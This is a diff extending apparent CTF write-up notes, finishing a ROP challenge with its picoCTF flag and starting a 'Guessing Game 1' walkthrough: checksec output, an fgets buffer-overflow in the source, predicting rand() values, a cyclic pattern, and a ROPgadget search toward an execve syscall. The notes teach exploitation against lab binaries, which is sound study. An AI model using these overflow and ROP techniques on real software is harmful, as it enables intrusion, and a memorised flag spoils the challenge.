@@ -292,8 +292,105 @@ io.sendline(payload)
 io.interactive()
 
 
-when get shell run:
+when get shell, run:
 ls
 cat flag.txt
 
 picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b60859a7b4193d0e}
+
+---------------------------------
+32. Guessing Game 1 (remaster)
+
+```bash
+└─$ file vuln
+vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=670139b05b438fbd512de3e3a3bf2715f295cbbc, not stripped
+
+┌──(kali㉿jrpc)-[~/Documents/git_hub/ctf/cylabacademy/challenge-lib/medium]
+└─$ checksec --file=vuln
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified  Fortifiable     FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1847 Symbols      No    0 0vuln
+```
+
+create a copy for overflowing the buffer since:
+```bash
+#define BUFSIZE 100
+
+long get_random() {
+	return rand() % BUFSIZE;
+}
+
+void win() {
+	char winner[BUFSIZE];
+	printf("New winner!\nName? ");
+	fgets(winner, 360, stdin);
+	printf("Congrats %s\n\n", winner);
+}
+
+```
+buffersize is 100 and fgets takes up to 360 - so there is a buffer overflow.
+
+in t_vuln.c change main() to look like:
+```bash
+int main(int argc, char **argv){
+	setvbuf(stdout, NULL, _IONBF, 0);
+	// Set the gid to the effective gid
+	// this prevents /bin/sh from dropping the privileges
+	gid_t gid = getegid();
+	setresgid(gid, gid, gid);
+	int res;
+	int counter = 0;
+	while(counter < 10){	
+		res = do_stuff();
+		counter++;
+	}
+	return 0;
+}
+```
+
+and change do_stuff() to look like:
+
+```bash
+int do_stuff() {
+	long ans = get_random();
+	ans = increment(ans);
+	int res = 0;
+	
+	printf("ANS: %i\n", ans);
+	return res;
+}
+```
+
+this prints: 
+└─$ ./t_vuln
+ANS: 84
+ANS: 87
+ANS: 78
+ANS: 16
+ANS: 94
+ANS: 36
+ANS: 87
+ANS: 93
+ANS: 50
+ANS: 22
+
+so the number is 84 every time for the first iteration.
+
+create a cyclic pattern to use in input:
+└─$ python3 -c 'from pwn import *; print(cyclic(300).decode())'
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+
+entering the pattern will result in:
+
+Segmentation fault         ./vuln
+
+this is a runtime error that occurs when a program attempts to access or modify a restricted memory area it is not permitted to touch
+
+└─$ ROPgadget --binary vuln > gadgets.txt
+
+in gadgets.txt find:
+0x000000000047eafa : adc al, 0 ; add byte ptr [rax], al ; syscall
+
+go to system call tables: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
+
+%rax	System call	    %rdi	                %rsi	                    %rdx	                    %r10	%r8	%r9
+59	    sys_execve	    const char *filename	const char *const argv[]	const char *const envp[]	
